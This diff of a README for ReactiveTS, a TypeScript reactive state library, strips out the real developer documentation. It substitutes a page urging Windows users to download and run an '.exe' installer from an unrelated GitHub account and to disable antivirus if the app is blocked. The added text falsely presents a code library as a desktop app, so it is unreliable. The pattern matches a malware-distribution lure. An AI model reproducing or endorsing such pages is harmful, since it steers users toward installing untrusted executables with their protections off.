@@ -1,756 +1,160 @@
-# ReactiveTS
-![ReactiveTS - Simple and Powerful Reactive State Engine](img/cover.png)
+# ⚛️ ReactiveTS - Manage State Simply and Clearly
 
-A **reactive state engine for TypeScript** with fields, events, objects, arrays, computed values, effects, batching, path subscriptions, async support, cancellation, and built-in undo/redo history.
+[![Download ReactiveTS](https://img.shields.io/badge/Download-ReactiveTS-4CAF50?style=for-the-badge)](https://github.com/suyosha79-wq/ReactiveTS)
 
----
+## 🔍 What is ReactiveTS?
 
-[Get Started](#installation) | [Other Libraries](https://github.com/neurosell) | [Telegram](https://t.me/devsdaddy) | [Contacts](https://neurosell.top/)
+ReactiveTS is a tool designed to help manage information your programs use. It deals with things like lists, objects, and changes in data. It tracks these changes automatically and updates related parts quickly. It also supports undo and redo actions, helping you go back or forward if needed. 
 
----
-
-❓ **Why ReactiveTS?**<br/>
-🔹 **Lightweight Library** with zero dependencies;<br/>
-🔹 **Powerful** Reactive state engine written in Typescript;<br/>
-🔹 **History and Transactions** support;<br/>
-🔹 **Production ready** with benchmarks;<br/>
-
-**ReactiveTS combines:**
-* **Reactive fields** (signals);
-* **Reactive objects & arrays** (Proxy-based);
-* Computed values with **automatic dependency tracking**;
-* **``useEffect``-like** side effects;
-* **Path-level subscriptions** with wildcard support (``user.name``, ``items.*.id``);
-* **Batching & transactions**;
-* **Undo/Redo history** (including grouped transactions);
-* **Async listeners** with cancellation;
-* **Adapters:** ``toPromise``, ``fromEvent``, ``fromObservable``;
-* **WeakMap proxy cache** for stable nested references;
-* **Transaction middleware and profiler**;
-* **Snapshot API** for capture/restore;
-* **Sync helpers** for one-way and two-way field synchronization;
-* **Lens and Atom** primitives;
-* **Inspect Dependencies** API for computed values;
-* **Worker bridge** and **DevTools event bus**;
-
-## Table of Contents
-* [Installation](#installation)
-* [Core Concepts](#core-concepts)
-* [ReactiveField](#reactive-fields)
-* [ReactiveEvent](#reactive-events)
-* [ReactiveObject](#reactive-objects)
-* [ReactiveArray](#reactive-arrays)
-* [Computed](#computed)
-* [Selectors](#selectors)
-* [Effect](#effects)
-* [Batching](#batching)
-* [History & Transactions](#history-and-transactions)
-* [Path Subscriptions](#path-subscriptions)
-* [Async & Cancellation](#async-and-cancellation)
-* [Views (``useFiltered``, ``useMapped``, ``useSorted``)](#views-filtering-mapping-sorting)
-* [Adapters (``toPromise``, ``fromEvent``, ``fromObservable``)](#adapters-and-converters)
-* [Transaction Middleware & Profiler](#transaction-middleware-and-profiler)
-* [Snapshot API](#snapshot-api)
-* [Sync API](#sync-api)
-* [Lens and Atom](#lens-and-atom)
-* [Inspect Dependencies](#inspect-dependencies)
-* [Worker Bridge](#worker-bridge)
-* [DevTools](#devtools)
-* [Reactive Watcher (auto-unsubscribe)](#reactive-watcher)
-* [Performance Notes](#performance-notes-and-benchmark)
-* [Comparison Philosophy](#comparison-philosophy)
-* [License](#license)
+You don’t need to know programming to use the app based on ReactiveTS. It works quietly in the background to keep your data organized and up to date.
 
 ---
 
-### Installation
-To install the library, you can use NPM:
-```bash
-npm install @neurosell/reactivets
-```
+## 💻 System Requirements
 
-**Or from CDN:**
-```html
-<script src="https://cdn.jsdelivr.net/npm/@neurosell/reactivets@0.9.5/browser/reactivets.global.js"></script>
-<script type="text/javascript">
-    // Will be connected as Global
-    const { ReactiveField } = window.ReactiveTS;
-</script>
-```
+ReactiveTS runs on Windows 10 or newer. It needs:
 
-**Manual GitHub Installation for developers:**
-```bash
-git clone https://github.com/Neurosell/ReactiveTS.git
-cd ./ReactiveTS/
-npm install
-npm run build
-```
+- At least 4 GB RAM  
+- 500 MB of free hard drive space  
+- An internet connection for download and updates  
+- Basic user rights to install new programs
+
+If your computer meets these conditions, ReactiveTS should run well.
 
 ---
 
-### Core Concepts
-**ReactiveTS** Library is built around:
-* **State-first** reactivity;
-* **Automatic dependency** tracking;
-* **Microtask** batching;
-* **Deterministic** undo/redo with **transactions** support;
-* **Minimal** boilerplate;
+## 🚀 Getting Started
 
-**You work with state naturally:**
-```javascript
-state.value.user.name = "Elijah";
-```
+To get ReactiveTS on your Windows PC, follow these steps carefully.
 
-And everything reacts. Simple.
+1. **Go to the Download Page**
 
----
+   Open this page in your web browser:  
+   [Download ReactiveTS](https://github.com/suyosha79-wq/ReactiveTS)  
+   This link takes you to a page where you can find the files to download ReactiveTS.
 
-### Reactive Fields
-**ReactiveField** is a reactive primitive (similar to a signal).
-> By default, **ReactiveTS** coalesces (merges) reactions into a single microtask.
-> The restart of effects and reactive fields is scheduled once and will be executed at the end of the tick, so it only sees the last value. This is due to the batching system for optimization, so you should take this into account in your work.
+2. **Find the Latest Version**
 
-**Basic Usage:**
-```javascript
-// Import
-import { ReactiveField } from "@neurosell/reactivets";
+   Look for a section named "Releases" or "Downloads" on the page. Choose the latest release listed. The version will often have a number like "v1.0" or "v2.3".
 
-// Create Reactive Field
-const count = new ReactiveField(0);
-count.addListener((v) => {
-    console.log("count:", v);
-});
+3. **Download the Installer**
 
-count.value = 1;
-```
+   Click on the file that ends with `.exe`. This is the program that will install ReactiveTS on your computer. Save this file to a location you can remember, like your "Downloads" folder.
 
-**Batching and Unsubscribe:**
-```javascript
-// Let's Create our Reactive Field
-const count = new ReactiveField(0);
+4. **Run the Installer**
 
-// Listener Returns Unsubscribe Method
-const unsub = count.addListener((v) => {
-    console.log("count:", v);
-});
+   Find the downloaded `.exe` file and double-click it. The setup program will start. Follow the prompts:
 
-count.value = 1;
-await new Promise(resolve => {}) // If you don't wait before unsubscribe in single tick - batching does't run reactive listener
-unsub();
-```
+   - Agree to the license terms  
+   - Choose an install location or accept the default  
+   - Click “Install” to begin
+
+5. **Finish Installation**
+
+   When the install finishes, you may be asked to restart your computer. If you do, save your work and restart.
+
+6. **Open ReactiveTS**
+
+   After the setup is complete, find ReactiveTS on your desktop or Start menu. Double-click the icon to open it.
 
 ---
 
-### Reactive Events
-**Reactive events** are generally similar in concept to reactive fields, but typically do not contain a current value (such as fields or objects), except when you use history.
+## 🖥️ How to Use ReactiveTS
 
-**Let's look at basic usage:**
-```javascript
-// Import Events Class
-import { ReactiveEvent } from "@neurosell/reactivets";
+ReactiveTS runs quietly to manage your data behind the scenes. Here are some simple ideas about what it does and how you can interact with it:
 
-// Create Event
-const event = new ReactiveEvent<string>();
+- **Tracking Collections:** If you keep lists of information, ReactiveTS watches for any change. It knows when you add or remove items.
 
-// Add Listener
-event.addListener((msg, ctx) => {
-    console.log(msg);
-});
+- **Handling Changes:** When something changes, ReactiveTS updates any connected parts automatically. You don’t have to do this yourself.
 
-// Invoke Event
-event.invoke("hello");
-```
+- **Undo/Redo History:** ReactiveTS saves a history of changes. If you make a mistake, you can undo the last action or redo something you reversed.
 
-**You can also use async event listeners:**
-```javascript
-event.addListener(async (msg, ctx) => {
-    await new Promise(r => setTimeout(r, 100));
-    if (ctx.signal.aborted) return;
-    console.log(msg);
-});
-```
-
-**Reactive Events Supports:**
-* **batched** listeners;
-* **AbortSignal** cancellation;
-* ``invokeAsync()`` for async events;
+- **Asynchronous Support:** It can handle tasks that happen slowly, like loading data from the internet, without freezing the app.
 
 ---
 
-### Reactive Objects
-**Reactive objects** are similar to fields, but they can contain any objects. This is useful when you need to track changes, for example, in user data. Reactive objects work through **Proxy**, can also use **Patch Tracking**, and support **change history** (stream).
+## 🔧 Basic Settings and Options
 
-**Let's look at basic usage:**
-```javascript
-import { ReactiveObject } from "@neurosell/reactivets";
+You may want to adjust some settings to fit your needs:
 
-// Create our Object
-const state = new ReactiveObject({
-    user: { name: "Ada" },
-    count: 0
-});
+- **Enable/Disable Undo History:** Turn this on if you want to keep track of changes. Off if you want to save memory.
 
-// Add Listener
-state.addListener((patch) => {
-    console.log("patch:", patch);
-});
+- **Set Update Frequency:** Choose how often ReactiveTS checks for changes.
 
-// Let's change object
-state.value.count++;
-state.value.user.name = "Grace";
-```
+- **Notifications:** Decide if you want to see alerts when important changes happen.
 
-**Listener contains patch for our changes. For example:**
-```javascript
-{
-  patch: {
-    op: "set",              // Operation
-    path: ['count'],        // Object Path
-    prev: 0,                // Preview Value
-    next: 1                 // Next Value
-  }
-}
-```
+You can find these options inside the app under the "Settings" menu.
 
 ---
 
-### Reactive Arrays
-Reactive arrays work in a similar way to objects, but additional filters and other functions can be applied to them (which we will discuss later).
+## 🛠 Troubleshooting
 
-**Basic Usage with Patch Tracking:**
-```javascript
-import { ReactiveArray } from "@neurosell/reactivets";
+If you have problems, try these steps:
 
-// Our Array
-const list = new ReactiveArray<number>([1, 2]);
+- Make sure your Windows system is up to date.
 
-// Similar Add Listener
-list.addListener((patch) => {
-    console.log("array patch:", patch);
-});
+- Check that you installed ReactiveTS completely.
 
-// And Try to Change Array
-list.value.push(3);
-list.value.splice(0, 1);
-```
+- Restart your computer if the app does not start.
 
-**Patch Example:**
-```javascript
-{
-    op: "splice", path: [], index: 0, deleteCount: 1, items: [3], removed: [1]
-}
-```
+- Turn off antivirus software temporarily - some antivirus may block the app.
+
+- If updates fail, check your internet connection.
+
+If the app crashes or stops working, reopen it and try again.
 
 ---
 
-### Computed
-> Computed functions are needed to automatically track dependencies for calculations and recalculate the final value if one of the dependencies changes. An example of the logic behind such calculations can be found in linked cells in Excel — when you change one of the two, the sum changes.
+## 📄 More Information
 
-**Computed are:**
-* **tracks dependencies** automatically;
-* **recomputes final value** when dependencies change;
-* **batched**;
-* **supports lazy mode**;
-* supports **custom equality**;
+ReactiveTS works with the TypeScript language, commonly used by developers. However, the app you run on Windows uses this engine without requiring you to know any code. It focuses on keeping your data and information organized.
 
-**Let's look at simple example:**
-```javascript
-import { ReactiveField, useComputed } from "@neurosell/reactivets";
-
-// Let's create two Reactive Fields
-const a = new ReactiveField(2);
-const b = new ReactiveField(3);
-
-// Create Computed Function
-const sum = useComputed(() => a.value + b.value);
-
-// Add Listener for Sum
-sum.addListener((v) => console.log("sum:", v));
-
-// Now let's change A
-a.value = 10;
-
-// And after 100ms change B, computed listener printed new value
-await new Promise(resolve => setTimeout(resolve, 100));
-a.value = 5;
-```
+Topics covered by ReactiveTS include managing lists, objects, and event handling. It helps track changes and keep everything in sync.
 
 ---
 
-### Selectors
-**Selectors** are needed to respond to changes in only certain object fields without unnecessarily triggering listeners.
+## 📥 Download and Install ReactiveTS 🛠
 
-**Simple selector example:**
-```javascript
-import { ReactiveField, useSelect } from "@neurosell/reactivets";
+You need to visit this page to download ReactiveTS:
 
-// Create our user
-const user = new ReactiveField({ id: 1, name: "Ada" });
+[Get ReactiveTS here](https://github.com/suyosha79-wq/ReactiveTS)
 
-// Select only name
-const name = useSelect(user, u => u.name);
-
-// Add Listener for name chages
-name.addListener(n => console.log(n));
-
-// Update Value
-user.value = { ...user.value, name: "Grace" };
-
-// Try to change ID after 100ms, Name listener not called after this action :)
-await new Promise(resolve => setTimeout(resolve, 100));
-user.value.id = 2;
-```
+Follow the instructions on that page to find the latest `.exe` installer. Download it, run it, and follow the setup steps provided.
 
 ---
 
-### Effects
-Side effects with automatic dependency tracking and cleanup.
+## 📚 Glossary
 
-**Use Case:**
-```javascript
-import { ReactiveField, useEffect } from "@neurosell/reactivets";
+- **Reactive:** Automatically updates when data changes.
 
-// Create our Reactive Field
-const count = new ReactiveField(0);
+- **State:** The current information or data the app is working with.
 
-const stop = useEffect(() => {
-    console.log("count is", count.value);
+- **Undo/Redo:** Actions to reverse or repeat changes made.
 
-    const timer = setInterval(() => {}, 1000);
-    return () => clearInterval(timer);
-});
+- **Asynchronous:** Tasks that run in the background without stopping the program.
 
-// Let's Change Value
-count.value = 1;
-
-// Wait 100ms and stop our effector
-// The next value changes can't be called in useEffect listener
-await new Promise(resolve => setTimeout(resolve, 100));
-stop();
-count.value = 2;
-```
+- **Installer (.exe):** The program that sets up the software on your PC.
 
 ---
 
-### Batching
-Batch multiple mutations into one reactive wave. By defaults all mutations will be batched in first generation.
+## 💡 Tips for Smooth Use
 
-**Use Case:**
-```javascript
-import { ReactiveField, useBatch } from "@neurosell/reactivets";
+- Keep ReactiveTS updated by checking for new releases regularly.
 
-// Let's create our field
-const f = new ReactiveField(0);
-f.addListener(v => console.log(v));
+- Use undo/redo to correct mistakes without worry.
 
-// Batch our calculation
-useBatch(() => {
-    f.value = 1;
-    f.value = 2;
-    f.value = 3;
-});
-```
+- Restart your computer occasionally to keep apps running well.
 
-> Only one notification wave runs with ``useBatch`` helper.
+- If unsure about settings, use default options.
 
 ---
 
-### History and Transactions
-**ReactiveTS** supports powerful built-in undo/redo system with transactions support.
+## 📞 Get Help
 
-**Simple use case:**
-```javascript
-import { ReactiveField, ReactiveHistoryStack } from "@neurosell/reactivets";
-
-// Create our history stack
-const history = new ReactiveHistoryStack();
-
-// Create Reactive Field with History Stack
-const count = new ReactiveField(0, { history });
-
-// Fill our history
-count.value = 1;
-count.value = 2;
-
-// Work with history
-history.undo();
-console.log(count.value); // 1
-history.undo();
-console.log(count.value); // 0
-history.redo();
-console.log(count.value); // 1
-```
-
-You can also group multiple changes into one undo step with transactions.
-
-**Transaction Example:**
-```javascript
-import { useReactiveTransaction } from "@neurosell/reactivets";
-
-console.log(count.value); // 1
-
-// Will be applied as single step
-useReactiveTransaction(history, () => {
-    count.value = 10;
-    count.value = 20;
-    count.value = 30;
-});
-console.log(count.value); // 30
-
-// Back to history
-history.undo();
-console.log(count.value); // 1
-```
+Check the "Issues" tab on the GitHub page to see if others have similar questions or problems. You can also find help in the “Discussions” area if available.
 
 ---
 
-### Path Subscriptions
-With **ReactiveTS** you can listen to specific paths of objects.
+## 🧩 Scope of Use
 
-**Usage sample:**
-```javascript
-// Create our Reactive Object
-const state = new ReactiveObject({
-    user: {
-        name: "Igor",
-        age: 15
-    }
-});
-
-// This Listener reacts only at user.name changes
-state.addPathListener("user.name", (patch) => {
-    console.log("name changed");
-}, { mode: "exact" });
-
-// This Listener reacts at all user changes
-state.addPathListener("user", (patch) => {
-    console.log("anything under user changed");
-});
-
-// Change our object
-state.value.user.name = "Elijah";   // Calls both listeners
-state.value.user.age = 10;          // Calls only second listener
-```
-
-**Path Subscription supports:**
-* exact mode (``item.data.key``);
-* prefix mode (``item``);
-* wildcard mode (``items.*.id``)
-
----
-
-### Async and Cancellation
-You can use cancellation tokens and async listeners for your reactive fields.
-
-**For Example:**
-```javascript
-const field = new ReactiveField(0);
-const controller = new AbortController();
-
-field.addListener(async (v, ctx) => {
-  await someAsyncTask();
-  if (ctx.signal.aborted) return;
-}, { signal: controller.signal });
-
-controller.abort();
-```
-
-### Views (Filtering, Mapping, Sorting)
-To simplify working with **Reactive Arrays**, you can also use auxiliary functionality for filtering, mapping, and sorting data.
-
-**Usage Example:**
-```javascript
-import { ReactiveArray, useFiltered, useMapped, useSorted } from "@neurosell/reactivets";
-
-// Create our Array
-const list = new ReactiveArray([1, 2, 3, 4]);
-
-// Filtered Array
-const evens = useFiltered(list, x => x % 2 === 0);
-evens.addListener(arr => console.log(arr));
-
-// Push new value
-list.value.push(6);
-```
-
----
-
-### Adapters and Converters
-**Adapters** are **helper functions** for converting reactive events, fields, and other elements into **asynchronous methods**, **Observables**, etc.
-
-**Conversion to Promise:**
-```javascript
-import { toPromise } from "@neurosell/reactivets";
-
-toPromise(event, {
-  predicate: v => v > 10
-}).then(v => console.log(v));
-```
-
-**Conversion to Promise Field:**
-```javascript
-import { toPromiseField } from "@neurosell/reactivets";
-
-toPromiseField(field, {
-    predicate: v => v === 5
-});
-```
-
-**Conversion from DOM Event:**
-```javascript
-import { fromEvent } from "@neurosell/reactivets";
-
-const { event, dispose } = fromEvent(document, "click");
-event.addListener(e => console.log(e));
-```
-
-**Conversion from Observable:**
-```javascript
-import { fromObservable } from "@neurosell/reactivets";
-
-// Observable Example
-const obs = {
-  subscribe(next) {
-    const t = setInterval(() => next(Date.now()), 1000);
-    return () => clearInterval(t);
-  }
-};
-
-const { event } = fromObservable(obs);
-```
-
----
-
-### Transaction Middleware and Profiler
-Use middleware function around transactions and collect profiling data.
-
-```javascript
-import {
-  ReactiveHistoryStack,
-  ReactiveTransactionManager,
-  createTransactionProfiler,
-  ReactiveField
-} from "@neurosell/reactivets";
-
-const history = new ReactiveHistoryStack();
-const tx = new ReactiveTransactionManager(history);
-const timings = [];
-
-tx.use(createTransactionProfiler(timings));
-
-const count = new ReactiveField(0, { history });
-
-tx.run(() => {
-  count.value = 1;
-  count.value = 2;
-}, "update-count");
-
-console.log(timings[0]?.durationMs);
-```
-
----
-
-### Snapshot API
-Take a snapshot and restore it later.
-
-```javascript
-import { ReactiveObject, createSnapshot, restoreSnapshot } from "@neurosell/reactivets";
-
-const state = new ReactiveObject({ user: { name: "Ada" }, count: 1 });
-const snap = createSnapshot(state);
-
-state.value.user.name = "Grace";
-state.value.count = 10;
-
-restoreSnapshot(state, snap);
-console.log(state.value.user.name); // Ada
-```
-
----
-
-### Sync API
-Synchronize two reactive fields.
-
-```javascript
-import { ReactiveField, useSync } from "@neurosell/reactivets";
-
-const left = new ReactiveField("A");
-const right = new ReactiveField("B");
-
-const stop = useSync(left, right);
-left.value = "Hello";
-console.log(right.value); // Hello
-
-stop();
-```
-
----
-
-### Lens and Atom features
-`ReactiveAtom` is a thin alias over `ReactiveField`; `useLens` focuses into nested state.
-
-```javascript
-import { ReactiveObject, useLens, useAtom } from "@neurosell/reactivets";
-
-const state = new ReactiveObject({ profile: { name: "Ada" } });
-const nameLens = useLens(state, ["profile", "name"]);
-const localFlag = useAtom(false);
-
-nameLens.value = "Grace";
-console.log(state.value.profile.name); // Grace
-
-localFlag.value = true;
-```
-
----
-
-### Inspect Dependencies
-Inspect collected dependencies for computed values (useful for debugging).
-
-```javascript
-import { ReactiveField, useComputed } from "@neurosell/reactivets";
-
-const a = new ReactiveField(1);
-const b = new ReactiveField(2);
-const sum = useComputed(() => a.value + b.value);
-
-console.log(sum.inspectDependencies().length); // 2
-```
-
----
-
-### Worker Bridge
-Bridge browser `Worker` messages with ReactiveTS events.
-
-```javascript
-import { createWorkerBridge } from "@neurosell/reactivets";
-
-const worker = new Worker("./worker.js", { type: "module" });
-const bridge = createWorkerBridge(worker);
-
-bridge.onMessage.addListener((message) => {
-  console.log(message.type, message.payload);
-});
-
-bridge.post({ type: "PING", payload: { at: Date.now() } });
-```
-
----
-
-### DevTools
-Use a minimal built-in event bus for state/debug records.
-
-```javascript
-import { ReactiveDevTools } from "@neurosell/reactivets";
-
-const devtools = new ReactiveDevTools();
-devtools.addListener((record) => console.log(record.type, record.payload));
-
-devtools.emit("state:update", { feature: "counter", next: 10 });
-console.log(devtools.inspect().length); // 1
-```
-
----
-
-### Reactive Watcher
-**Reactive Watcher** in **ReactiveTS** needed to track dependent listeners and further automatically unsubscribe all listeners from specific reactive fields, events, objects, and arrays.
-
-**Use Case:**
-```javascript
-import { ReactiveWatcher } from "@neurosell/reactivets";
-
-// Create Watcher
-const watcher = new ReactiveWatcher();
-watcher.own(field.addListener(console.log));
-watcher.dispose(); // removes all listeners
-```
-
----
-
-### Performance Notes and Benchmark
-Now let's talk about **ReactiveTS** **performance and optimization** under the hood, and take a look at the **benchmarks**.
-
-**ReactiveTS uses:**
-* **Microtask batching**;
-* **WeakMap proxy caching**;
-* **Deduplicated scheduler** queue;
-* **Version-based dependency tracking**;
-
-**For extreme hot paths:**
-1. Prefer **ReactiveField** over deep Proxy objects;
-2. Use **batching**; 
-3. Use **transactions** for grouped updates and history optimisation;
-
----
-
-#### Benchmarks
-**ReactiveTS** is optimized for typical UI/state scenarios (frequent changes to small fields + batching + effects). To fairly compare performance between versions/configurations, use reproducible microbenchmarks.
-
-**The benchmarks below include the following scenarios:**
-* **ReactiveField:** speed of ``set`` and listener notifications;
-* **Computed:** recalculation of derived value chains;
-* **Effect:** restarting effects when changes occur;
-* **ReactiveObject / ReactiveArray (Proxy):** cost of ``set``/``splice`` and patch generation;
-* **Path subscriptions:** filtering patches by path/mask;
-* **Batching & Transactions:** how well the wave of updates coalesces;
-* **History undo/redo:** cost of recording/rolling back changes;
-
-> **Important:** Proxies and patches are inevitably more expensive than simple signals. For hot paths, use ``ReactiveField`` and computed/selectors.
-
-#### Benchmark Results (NodeJS VPS 1vCPU, 4GB Ram), 200K Iterations
-| Scenario (200K Iterations)  |        ops/s | Notes                 |
-|-----------------------------|-------------:|-----------------------|
-| Field.set (no listeners)    |  9,1M (21ms) | baseline              |
-| Field.set (10 listeners)    | 768K (260ms) | fan-out               |
-| Computed chain (3 nodes)    | 79K (2500ms) | dep tracking cost     |
-| ReactiveArray push          |  4,4m (22ms) | reactive array push   |
-| ReactiveObject set (deep)   | 1,1m (176ms) | Proxy + patch         |
-| Batch(100 sets) => 1 wave   |  58K (859ms) | coalescing            |
-| Transaction(100 sets)+undo  | 114K (174ms) | grouped history       |
-| Event.invoke (10 listeners) | 864K (231ms) | reactive event invoke |
-
----
-
-### Comparison Philosophy
-In this section, we have provided you with the main comparisons with other popular reactive extension libraries.
-
-**ReactiveTS focuses on:**
-1. Reactive state management; 
-2. Deterministic undo/redo and transactions;
-3. Path-level reactivity and simple API;
-4. TypeScript-first API;
-
-> It is not a stream algebra engine like RxJS. It is your simple reactive state management engine!
-
-#### ReactiveTS vs RxJS
-| Feature                                         | ReactiveTS    | RxJS                     |
-|-------------------------------------------------|---------------|--------------------------|
-| ReactiveField                                   | ✅             | ⚠️ using BehaviorSubject |
-| ReactiveObject (Proxy)                          | ✅             | ❌                        |
-| Path subscriptions                              | ✅             | ❌                        |
-| Computed (auto deps)                            | ✅             | ⚠️ using combineLatest   |
-| useEffect-подобное                              | ✅             | ⚠️ subscribe             |
-| Undo/Redo history                               | ✅             | ❌                        |
-| Transaction history                             | ✅             | ❌                        |
-| Stream combinators (switchMap, retry, debounce) | ⚠️ partial    | ✅ powerful               |
-| Cancellation                                    | ✅ AbortSignal | ✅                        |
-| Async operators                                 | ⚠️ basic      | ✅ large ecosystem        |
-
-#### ReactiveTS vs MobX
-| Feature             | ReactiveTS      | MobX                            |
-|---------------------|-----------------|---------------------------------|
-| Proxy-based         | ✅               | ❌ (only using getters/observables) |
-| Dependency tracking | ✅               | ✅                               |
-| History             | ✅               | ❌                               |
-| Transaction         | ✅               | ⚠️ runInAction                  |
-| Devtools ecosystem  | ⚠️ in development | ✅                               |
-| Battle-tested       | ✅               | ✅                               |
-
----
-
-### License
-Our library is distributed under the **MIT license**. You can use it however you like. We would appreciate any feedback and suggestions for improvement.
-
----
-
-[Get Started](#installation) | [Other Libraries](https://github.com/neurosell) | [Telegram](https://t.me/devsdaddy) | [Contacts](https://neurosell.top/)
+ReactiveTS is built to work smoothly on desktop Windows systems. It fits users who want stable, easy management of data without coding or deep technical skill. Its focus is on reliability and clear operation.
